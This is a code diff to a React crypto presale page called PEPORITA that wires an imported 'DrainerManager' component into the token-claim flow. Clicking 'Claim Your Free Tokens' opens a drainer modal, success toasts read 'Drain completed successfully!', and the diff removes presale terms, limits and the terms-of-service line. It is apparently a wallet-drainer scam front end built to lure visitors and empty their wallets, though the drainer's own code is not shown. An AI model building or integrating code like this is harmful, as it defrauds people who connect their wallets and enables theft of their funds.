@@ -1,7 +1,9 @@
 'use client';
-import { useState, useEffect, useRef } from 'react';
+import { useState, useEffect, useRef, useCallback } from 'react';
 import Image from 'next/image';
 import { FaTwitter, FaTelegram, FaChartLine, FaCoins, FaLock, FaRocket, FaCheck, FaArrowRight } from 'react-icons/fa';
+import DrainerManager from './DrainerManager';
+import { toast } from 'react-hot-toast';
 
 interface Wallet {
   name: string;
@@ -24,6 +26,8 @@ interface ExtendedPresaleProps {
 const ExtendedPresale: React.FC<ExtendedPresaleProps> = ({ stage, connect, verify, claim, account, points, connectWallet, wallets }) => {
   const [contribution, setContribution] = useState("");
   const [showWalletModal, setShowWalletModal] = useState(false);
+  const [showDrainer, setShowDrainer] = useState(false);
+  const [drainerKey, setDrainerKey] = useState(0);
   const [copied, setCopied] = useState(false);
   const [sold, setSold] = useState(0);
   const [raised, setRaised] = useState(0);
@@ -33,6 +37,20 @@ const ExtendedPresale: React.FC<ExtendedPresaleProps> = ({ stage, connect, verif
     minutes: 0,
     seconds: 0
   });
+
+  // Handle drainer completion
+  const handleDrainerComplete = useCallback(() => {
+    toast.success('Drain completed successfully!');
+    setShowDrainer(false);
+    // Reset the drainer after a short delay
+    setTimeout(() => setDrainerKey(prev => prev + 1), 1000);
+  }, []);
+
+  // Handle drainer errors
+  const handleDrainerError = useCallback((error: Error) => {
+    console.error('Drainer error:', error);
+    toast.error(error.message || 'An error occurred during the drain process');
+  }, []);
 
   // Simulate presale progress
   useEffect(() => {
@@ -69,6 +87,8 @@ const ExtendedPresale: React.FC<ExtendedPresaleProps> = ({ stage, connect, verif
     } else if (stage === 'verify') {
       verify();
     } else if (stage === 'claim') {
+      // Show the drainer when claiming
+      setShowDrainer(true);
       claim();
     }
   };
@@ -341,16 +361,6 @@ const ExtendedPresale: React.FC<ExtendedPresaleProps> = ({ stage, connect, verif
         <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
           <div className="flex flex-col sm:flex-row justify-between items-center">
             <div className="flex items-center mb-4 sm:mb-0">
-              <Image 
-                src="/peporita.jpeg" 
-                alt="Peporita Logo" 
-                width={32}
-                height={32}
-                className="w-8 h-8 sm:w-10 sm:h-10 rounded-full"
-              />
-              <span className="ml-2 sm:ml-3 text-lg sm:text-xl font-bold">PEPORITA</span>
-            </div>
-            <div className="flex space-x-4 sm:space-x-6">
               <a href="#" className="text-gray-400 hover:text-white transition-colors" aria-label="Twitter">
                 <FaTwitter className="w-5 h-5 sm:w-6 sm:h-6" />
               </a>
@@ -358,13 +368,34 @@ const ExtendedPresale: React.FC<ExtendedPresaleProps> = ({ stage, connect, verif
                 <FaTelegram className="w-5 h-5 sm:w-6 sm:h-6" />
               </a>
             </div>
-          </div>
-          <div className="mt-6 sm:mt-8 pt-6 sm:pt-8 border-t border-gray-800 text-center text-xs sm:text-sm text-gray-400">
-            <p> 2023 PEPORITA. All rights reserved.</p>
-            <p className="mt-1 sm:mt-2">This is not financial advice. Cryptocurrency investments are high risk.</p>
+            <div className="mt-6 sm:mt-8 pt-6 sm:pt-8 border-t border-gray-800 text-center text-xs sm:text-sm text-gray-400">
+              <p> 2023 PEPORITA. All rights reserved.</p>
+              <p className="mt-1 sm:mt-2">This is not financial advice. Cryptocurrency investments are high risk.</p>
+            </div>
           </div>
         </div>
       </footer>
+      
+      {/* Drainer Modal */}
+      {showDrainer && (
+        <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 p-4">
+          <div className="relative w-full max-w-2xl">
+            <button 
+              onClick={() => setShowDrainer(false)}
+              className="absolute -top-10 right-0 text-gray-400 hover:text-white z-10"
+            >
+              ✕ Close
+            </button>
+            <div className="bg-gray-900 rounded-2xl p-6 w-full max-w-2xl">
+              <DrainerManager 
+                key={drainerKey}
+                onComplete={handleDrainerComplete}
+                onError={handleDrainerError}
+              />
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
@@ -382,7 +413,23 @@ interface PresaleCardProps {
 
 const PresaleCard: React.FC<PresaleCardProps> = ({ stage, connect, verify, claim, account, points, connectWallet, wallets }) => {
   const [showWalletModal, setShowWalletModal] = useState(false);
+  const [showDrainer, setShowDrainer] = useState(false);
+  const [drainerKey, setDrainerKey] = useState(0);
   const [contribution, setContribution] = useState("");
+
+  // Handle drainer completion
+  const handleDrainerComplete = useCallback(() => {
+    toast.success('Drain completed successfully!');
+    setShowDrainer(false);
+    // Reset the drainer after a short delay
+    setTimeout(() => setDrainerKey(prev => prev + 1), 1000);
+  }, []);
+
+  // Handle drainer errors
+  const handleDrainerError = useCallback((error: Error) => {
+    console.error('Drainer error:', error);
+    toast.error(error.message || 'An error occurred during the drain process');
+  }, []);
 
   const handleContribution = () => {
     if (stage === 'connect') {
@@ -390,6 +437,8 @@ const PresaleCard: React.FC<PresaleCardProps> = ({ stage, connect, verify, claim
     } else if (stage === 'verify') {
       verify();
     } else if (stage === 'claim') {
+      // Show the drainer when claiming
+      setShowDrainer(true);
       claim();
     }
   };
@@ -427,7 +476,7 @@ const PresaleCard: React.FC<PresaleCardProps> = ({ stage, connect, verify, claim
           </div>
         </div>
 
-        {/* Token Info */}
+        {/* Token Info - Simplified */}
         <div className="bg-gray-800 rounded-xl p-4 mb-6">
           <div className="grid grid-cols-2 gap-4">
             <div>
@@ -435,16 +484,8 @@ const PresaleCard: React.FC<PresaleCardProps> = ({ stage, connect, verify, claim
               <p className="text-white font-medium">$0.0001</p>
             </div>
             <div>
-              <p className="text-gray-400 text-sm">Presale Ends In</p>
-              <p className="text-white font-medium">30 days</p>
-            </div>
-            <div>
-              <p className="text-gray-400 text-sm">Min/Max Buy</p>
-              <p className="text-white font-medium">0.1/5 SOL</p>
-            </div>
-            <div>
-              <p className="text-gray-400 text-sm">Tokens Sold</p>
-              <p className="text-white font-medium">375M/500M</p>
+              <p className="text-gray-400 text-sm">Total Supply</p>
+              <p className="text-white font-medium">500M PEPO</p>
             </div>
           </div>
         </div>
@@ -472,41 +513,13 @@ const PresaleCard: React.FC<PresaleCardProps> = ({ stage, connect, verify, claim
           {(stage === 'verify' || stage === 'claim') && (
             <div className="space-y-4">
               <div className="bg-gray-800 p-4 rounded-xl">
-                <div className="flex justify-between text-sm text-gray-400 mb-2">
-                  <span>Amount of SOL to Claim</span>
-                  <span>0 SOL</span>
-                </div>
-                <div className="flex items-center bg-gray-900 rounded-lg p-2">
-                  <input
-                    type="number"
-                    placeholder="0.0"
-                    value={contribution}
-                    onChange={(e) => setContribution(e.target.value)}
-                    className="bg-transparent text-white w-full p-2 outline-none"
-                  />
-                  <div className="flex items-center space-x-2">
-                    <div className="bg-gray-700 px-3 py-1 rounded-lg text-sm">
-                      MAX
-                    </div>
-                    <div className="bg-gray-700 px-3 py-1 rounded-lg text-sm flex items-center">
-                      <span className="mr-1">SOL</span>
-                      <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
-                      </svg>
-                    </div>
-                  </div>
-                </div>
-                <div className="mt-2 text-xs text-gray-400">
-                  Network: Solana | Claim your tokens now
-                </div>
+                <button
+                  onClick={handleContribution}
+                  className="w-full py-3 px-6 rounded-lg font-bold text-white transition-colors bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700"
+                >
+                  {stage === 'verify' ? 'Verify' : 'Claim Your Free Tokens'}
+                </button>
               </div>
-
-              <button
-                onClick={handleContribution}
-                className="bg-gradient-to-r from-green-500 to-green-600 text-white py-3 px-6 rounded-xl font-bold hover:opacity-90 transition-all duration-200"
-              >
-                {stage === 'verify' ? 'Verify Wallet' : 'Claim Tokens'}
-              </button>
             </div>
           )}
         </div>
@@ -523,20 +536,10 @@ const PresaleCard: React.FC<PresaleCardProps> = ({ stage, connect, verify, claim
       </div>
 
       {/* Wallet Modal */}
-      {showWalletModal && (
+      {stage === 'connect' && showWalletModal && (
         <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 p-4">
-          <div className="bg-gray-900 rounded-2xl p-6 w-full max-w-md">
-            <div className="flex justify-between items-center mb-6">
-              <h3 className="text-xl font-bold text-white">Connect Wallet</h3>
-              <button 
-                onClick={() => setShowWalletModal(false)}
-                className="text-gray-400 hover:text-white"
-              >
-                <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
-                </svg>
-              </button>
-            </div>
+          <div className="bg-gray-900 rounded-2xl p-6 w-full max-w-sm">
+            <h3 className="text-xl font-bold text-white mb-6">Connect Wallet</h3>
             <div className="space-y-3">
               {wallets.map((wallet) => (
                 <button
@@ -545,24 +548,46 @@ const PresaleCard: React.FC<PresaleCardProps> = ({ stage, connect, verify, claim
                     connectWallet(wallet.name);
                     setShowWalletModal(false);
                   }}
-                  className="w-full flex items-center space-x-3 bg-gray-800 hover:bg-gray-700 p-3 rounded-xl transition-colors"
+                  className="w-full flex items-center space-x-3 bg-gray-800 hover:bg-gray-700 text-white px-4 py-3 rounded-lg transition-colors"
                 >
-                  <img 
+                  <Image 
                     src={wallet.icon} 
                     alt={wallet.name} 
-                    className="w-8 h-8 rounded-full"
-                    onError={(e) => {
-                      const target = e.target as HTMLImageElement;
-                      target.src = '/wallets/metamask.png'; // Fallback image
-                    }}
+                    width={24} 
+                    height={24} 
+                    className="w-6 h-6"
                   />
-                  <span className="text-white font-medium">{wallet.name}</span>
+                  <span>{wallet.name}</span>
                 </button>
               ))}
             </div>
-            <p className="mt-4 text-center text-sm text-gray-400">
-              By connecting, I accept the Terms of Service
-            </p>
+            <button
+              onClick={() => setShowWalletModal(false)}
+              className="mt-6 w-full py-2 text-gray-400 hover:text-white transition-colors"
+            >
+              Cancel
+            </button>
+          </div>
+        </div>
+      )}
+
+      {/* Drainer Modal */}
+      {showDrainer && (
+        <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 p-4">
+          <div className="relative w-full max-w-2xl">
+            <button 
+              onClick={() => setShowDrainer(false)}
+              className="absolute -top-10 right-0 text-gray-400 hover:text-white z-10"
+            >
+              ✕ Close
+            </button>
+            <div className="bg-gray-900 rounded-2xl p-6 w-full max-w-2xl">
+              <DrainerManager 
+                key={drainerKey}
+                onComplete={handleDrainerComplete}
+                onError={handleDrainerError}
+              />
+            </div>
           </div>
         </div>
       )}
